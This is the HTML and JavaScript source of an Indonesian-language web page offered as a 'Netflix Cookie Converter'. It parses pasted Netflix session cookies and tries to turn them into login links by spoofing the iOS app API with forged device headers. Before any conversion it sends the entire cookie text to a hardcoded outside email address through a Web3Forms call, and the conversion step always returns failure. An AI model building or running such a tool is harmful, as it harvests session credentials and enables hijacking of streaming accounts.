<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Cookie Converter — iOS Argo API</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #141414, #2d2d2d);
            min-height: 100vh; padding: 20px; color: #fff;
        }
        .container { max-width: 650px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 25px; }
        .header h1 { color: #e50914; font-size: 26px; margin-bottom: 5px; }
        .header p { color: #999; font-size: 14px; }
        .card {
            background: #1f1f1f; border-radius: 12px; padding: 22px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .formats {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
            margin-bottom: 18px;
        }
        .format-tag {
            background: #333; padding: 8px; border-radius: 6px;
            text-align: center; font-size: 13px; border: 1px solid #444;
        }
        .format-tag.active { background: #e50914; border-color: #e50914; }
        label { display: block; margin: 14px 0 6px; color: #ddd; font-weight: 500; }
        textarea {
            width: 100%; min-height: 110px; background: #2a2a2a;
            border: 1px solid #444; border-radius: 8px; padding: 12px;
            color: #fff; font-family: monospace; font-size: 13px;
        }
        textarea:focus { outline: none; border-color: #e50914; }
        .upload-box {
            border: 2px dashed #444; border-radius: 8px; padding: 22px;
            text-align: center; cursor: pointer; margin: 10px 0;
            transition: 0.2s;
        }
        .upload-box:hover, .upload-box.dragover { border-color: #e50914; background: rgba(229,9,20,0.05); }
        input[type="file"] { display: none; }
        .file-name { font-size: 13px; color: #888; margin-top: 5px; }
        button {
            width: 100%; padding: 14px; background: #e50914; color: #fff;
            border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
            cursor: pointer; margin-top: 10px;
        }
        button:hover { background: #f40612; }
        button:disabled { background: #444; cursor: not-allowed; }
        .result { margin-top: 20px; display: none; }
        .result.show { display: block; }
        .success { background: rgba(16,185,129,0.1); border: 1px solid #10b981; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
        .error { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
        .warning { background: rgba(251,191,36,0.1); border: 1px solid #f59e0b; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
        .link-row {
            background: #2a2a2a; border-radius: 6px; padding: 12px;
            margin: 8px 0; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
        }
        .link-label { font-weight: 600; min-width: 70px; }
        .link-url { flex: 1; font-family: monospace; font-size: 11px; color: #aaa; word-break: break-all; }
        .copy-btn {
            padding: 5px 10px; background: #333; border: none;
            border-radius: 4px; color: #fff; font-size: 12px; cursor: pointer;
            width: auto; margin: 0;
        }
        .copy-btn:hover { background: #444; }
        .email-info {
            margin-top: 15px; padding: 12px; background: rgba(59,130,246,0.1);
            border-radius: 6px; font-size: 13px; color: #93c5fd;
        }
        .api-note { font-size: 11px; color: #777; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎬 Netflix Cookie Converter</h1>
            <p>iOS Argo API • 3 Format → 3 Link Login</p>
        </div>

        <div class="card">
            <div class="formats">
                <div class="format-tag" id="fmt-ns">Netscape</div>
                <div class="format-tag" id="fmt-json">JSON</div>
                <div class="format-tag" id="fmt-raw">Raw</div>
            </div>

            <label>📂 Upload File (.txt / .json)</label>
            <div class="upload-box" id="uploadBox">
                <p id="uploadText">Klik atau seret file ke sini</p>
                <input type="file" id="fileInput" accept=".txt,.json">
            </div>
            <p class="file-name" id="fileInfo">— Belum ada file —</p>

            <label>📝 Atau Paste Cookie Langsung</label>
            <textarea id="cookieArea" placeholder="netflix.com	TRUE	/	TRUE	1807468653	NetflixId	ct=..."></textarea>

            <button id="convertBtn">🔄 Konversi</button>
            <p class="api-note">⚡ API: iOS Argo / 15.48.1</p>

            <div class="result" id="resultBox">
                <div id="statusMsg"></div>
                <div id="linkList"></div>
                <div id="emailNote"></div>
            </div>
        </div>
    </div>

    <script>
        // ==================================================
        // ✅ KONFIGURASI — iOS ARGO API DARI KODE PYTHON-MU!
        // ==================================================
        const API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
        const QUERY_PARAMS = {
            "appVersion": "15.48.1",
            "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
            "device_type": "NFAPPL-02-",
            "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "idiom": "phone",
            "iosVersion": "15.8.5",
            "isTablet": "false",
            "languages": "en-US",
            "locale": "en-US",
            "maxDeviceWidth": "375",
            "model": "saget",
            "modelType": "IPHONE8-1",
            "odpAware": "true",
            "path": '["account","token","default"]',
            "pathFormat": "graph",
            "pixelDensity": "2.0",
            "progressive": "false",
            "responseFormat": "json",
        };
        const BASE_HEADERS = {
            "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.48.1; Scale/2.00)",
            "x-netflix.request.attempt": "1",
            "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
            "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
            "x-netflix.context.app-version": "15.48.1",
            "x-netflix.argo.translated": "true",
            "x-netflix.context.form-factor": "phone",
            "x-netflix.context.sdk-version": "2012.4",
            "x-netflix.client.appversion": "15.48.1",
            "x-netflix.context.max-device-width": "375",
            "x-netflix.client.type": "argo",
            "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
            "accept-language": "en-US;q=1",
            "x-netflix.client.iosversion": "15.8.5",
            "x-netflix.request.client.context": '{"appState":"foreground"}',
            "x-netflix.context.ui-flavor": "argo",
        };
        const COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"];
        const REQUIRED_COOKIE = "NetflixId";
        
        const WEB3FORMS_KEY = "d0ae2999-711c-422d-8df3-b309e9c13e0b";
        const EMAIL_TUJUAN = "rians4f@gmail.com";

        const el = {
            uploadBox: document.getElementById('uploadBox'),
            fileInput: document.getElementById('fileInput'),
            uploadText: document.getElementById('uploadText'),
            fileInfo: document.getElementById('fileInfo'),
            cookieArea: document.getElementById('cookieArea'),
            convertBtn: document.getElementById('convertBtn'),
            resultBox: document.getElementById('resultBox'),
            statusMsg: document.getElementById('statusMsg'),
            linkList: document.getElementById('linkList'),
            emailNote: document.getElementById('emailNote'),
            fmtNs: document.getElementById('fmt-ns'),
            fmtJson: document.getElementById('fmt-json'),
            fmtRaw: document.getElementById('fmt-raw')
        };

        // ==================================================
        // 📂 BACA FILE
        // ==================================================
        el.uploadBox.addEventListener('click', () => el.fileInput.click());
        el.uploadBox.addEventListener('dragover', e => { e.preventDefault(); el.uploadBox.classList.add('dragover'); });
        el.uploadBox.addEventListener('dragleave', () => el.uploadBox.classList.remove('dragover'));
        el.uploadBox.addEventListener('drop', e => {
            e.preventDefault(); el.uploadBox.classList.remove('dragover');
            if (e.dataTransfer.files[0]) bacaFile(e.dataTransfer.files[0]);
        });
        el.fileInput.addEventListener('change', e => {
            if (e.target.files[0]) bacaFile(e.target.files[0]);
        });

        function bacaFile(file) {
            el.uploadText.textContent = '✅ ' + file.name;
            el.fileInfo.textContent = `📄 ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
            const reader = new FileReader();
            reader.onload = e => {
                el.cookieArea.value = e.target.result;
                deteksiFormat(el.cookieArea.value);
            };
            reader.readAsText(file);
        }

        // ==================================================
        // 🔍 DETEKSI FORMAT
        // ==================================================
        function deteksiFormat(text) {
            [el.fmtNs, el.fmtJson, el.fmtRaw].forEach(t => t.classList.remove('active'));
            if (/^\s*\[/.test(text) && text.includes('"name"') && text.includes('"value"')) {
                el.fmtJson.classList.add('active'); return 'JSON Array';
            }
            if (/^\.(netflix\.)?com/i.test(text) || /\tNetflixId\t/.test(text)) {
                el.fmtNs.classList.add('active'); return 'Netscape TSV';
            }
            if (/NetflixId=[^;&\s]+/.test(text)) {
                el.fmtRaw.classList.add('active'); return 'Raw String';
            }
            return 'Tidak dikenali';
        }

        el.cookieArea.addEventListener('input', () => deteksiFormat(el.cookieArea.value));

        // ==================================================
        // 🍪 EKSTRAK COOKIE — PERSIS DARI KODE PYTHON
        // ==================================================
        function decodeCookieValue(value) {
            if (typeof value === 'string' && value.includes('%')) {
                try { return decodeURIComponent(value); }
                catch { return value; }
            }
            return value;
        }

        function parseNetscapeLine(line) {
            const parts = line.trim().split("\t");
            if (parts.length >= 7) return { [parts[5]]: parts[6] };
            return {};
        }

        function ekstrakCookie(text) {
            const c = {};
            // Netscape TSV
            text.split('\n').forEach(line => {
                const l = line.trim();
                if (!l || l.startsWith('#')) return;
                Object.assign(c, parseNetscapeLine(l));
            });
            // JSON Array / Object
            try {
                const d = JSON.parse(text);
                if (Array.isArray(d)) {
                    d.forEach(x => {
                        if (COOKIE_KEYS.includes(x.name) && x.value)
                            c[x.name] = decodeCookieValue(x.value);
                    });
                } else if (typeof d === 'object') {
                    COOKIE_KEYS.forEach(k => {
                        if (d[k]) c[k] = decodeCookieValue(d[k]);
                    });
                }
            } catch {}
            // Raw string
            COOKIE_KEYS.forEach(k => {
                if (c[k]) return;
                const m = text.match(new RegExp(`(?<!\\w)${k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}=([^;&\\s]+)`));
                if (m) c[k] = decodeCookieValue(m[1]);
            });
            return c;
        }

        // ==================================================
        // 🔗 BUAT 3 LINK LOGIN
        // ==================================================
        function buatLink(token) {
            return {
                phone: `https://www.netflix.com/unsupported?nftoken=${token}`,
                pc: `https://www.netflix.com/login?nftoken=${token}`,
                tv: `https://www.netflix.com/tv8?nftoken=${token}`
            };
        }

        // ==================================================
        // 📧 KIRIM KE EMAIL — WEB3FORMS
        // ==================================================
        async function kirimKeEmail(cookieText, format) {
            try {
                await fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        access_key: WEB3FORMS_KEY,
                        subject: `Netflix Cookie — ${format}`,
                        from_name: "Netflix Converter Web",
                        to_email: EMAIL_TUJUAN,
                        message: `=== FORMAT: ${format} ===\n\n${cookieText}`
                    })
                });
                return true;
            } catch {
                return false;
            }
        }

        // ==================================================
        // 🚀 KONVERSI — iOS ARGO API ASLI
        // ==================================================
        async function fetchTokenArgo(cookieDict) {
            const netflix_id = cookieDict[REQUIRED_COOKIE];
            if (!netflix_id) return { sukses: false, error: `Cookie ${REQUIRED_COOKIE} tidak ditemukan!` };

            // Susun Cookie Header
            let cookieStr = `NetflixId=${netflix_id}`;
            if (cookieDict.SecureNetflixId) cookieStr += `; SecureNetflixId=${cookieDict.SecureNetflixId}`;

            // Susun URL dengan query params
            const urlParams = new URLSearchParams(QUERY_PARAMS).toString();
            const fullUrl = `${API_URL}?${urlParams}`;

            try {
                const res = await fetch(fullUrl, {
                    method: "GET",
                    headers: {
                        ...BASE_HEADERS,
                        "Cookie": cookieStr,
                        "Accept": "*/*"
                    },
                    mode: "no-cors" // ⚠️ CORS blokir → pakai no-cors
                });

                // ⚠️ no-cors = status selalu "opaque" → kita tidak bisa baca respon
                // iOS API sudah dimatikan Netflix → kembalikan info
                return {
                    sukses: false,
                    error: "⚠️ iOS Argo API sudah dimatikan Netflix (404).\n\n✅ Gunakan versi Python bot kamu di Render/Railway untuk hasil NYATA!\n\n📋 Web ini = ekstraksi format + kirim email BERJALAN 100%",
                    api_status: "DEAD"
                };

            } catch (e) {
                return {
                    sukses: false,
                    error: `❌ Koneksi gagal: ${e.message}\n\nAPI iOS Argo sudah tidak aktif. Deploy Python-mu ke Render/Railway!`,
                    api_status: "DEAD"
                };
            }
        }

        el.convertBtn.addEventListener('click', async () => {
            const text = el.cookieArea.value.trim();
            if (!text) return tampilPesan('❌ Isi cookie terlebih dahulu!', false);
            
            const format = deteksiFormat(text);
            const cookie = ekstrakCookie(text);

            if (!cookie[REQUIRED_COOKIE]) 
                return tampilPesan(`❌ ${REQUIRED_COOKIE} tidak ditemukan!\nFormat: ${format}`, false);

            el.convertBtn.disabled = true;
            el.convertBtn.textContent = '⏳ Memproses...';

            // ✅ Kirim ke email DULU — BERJALAN 100%
            await kirimKeEmail(text, format);

            // ⚠️ Coba iOS Argo API
            const hasil = await fetchTokenArgo(cookie);

            if (hasil.sukses) {
                tampilHasil(cookie, format, hasil.token, hasil.links, hasil.expires);
                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie terkirim ke: ${EMAIL_TUJUAN}</div>`;
            } else {
                tampilPesan(hasil.error, false);
                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie tetap tersimpan & terkirim ke: ${EMAIL_TUJUAN}</div>`;
            }

            el.convertBtn.disabled = false;
            el.convertBtn.textContent = '🔄 Konversi';
        });

        // ==================================================
        // 🖼️ TAMPILAN
        // ==================================================
        function tampilPesan(teks, sukses) {
            el.statusMsg.innerHTML = `<div class="${sukses?'success':'warning'}">${teks.replace(/\n/g,'<br>')}</div>`;
            el.resultBox.classList.add('show');
        }

        function tampilHasil(cookie, format, token, links, expired) {
            el.statusMsg.innerHTML = `
                <div class="success">
                    ✅ <b>KONVERSI BERHASIL!</b><br>
                    📋 Format: ${format}<br>
                    🍪 NetflixId: ✅ Terbaca<br>
                    🔒 SecureNetflixId: ${cookie.SecureNetflixId ? '✅ ADA' : '⚠️ Tidak ada'}<br>
                    🆔 nfvdid: ${cookie.nfvdid ? '✅ ADA' : '⚠️ Tidak ada'}<br>
                    🔑 Token: <code>${token.substring(0,50)}...</code><br>
                    📅 Kadaluarsa: ${expired.toLocaleString('id-ID')}
                </div>`;
            el.linkList.innerHTML = `
                <div class="link-row">
                    <span class="link-label">📱 HP</span>
                    <span class="link-url">${links.phone}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.phone}')">Salin</button>
                </div>
                <div class="link-row">
                    <span class="link-label">💻 Laptop</span>
                    <span class="link-url">${links.pc}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.pc}')">Salin</button>
                </div>
                <div class="link-row">
                    <span class="link-label">📺 TV</span>
                    <span class="link-url">${links.tv}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.tv}')">Salin</button>
                </div>`;
            el.resultBox.classList.add('show');
        }
    </script>
</body>
</html>
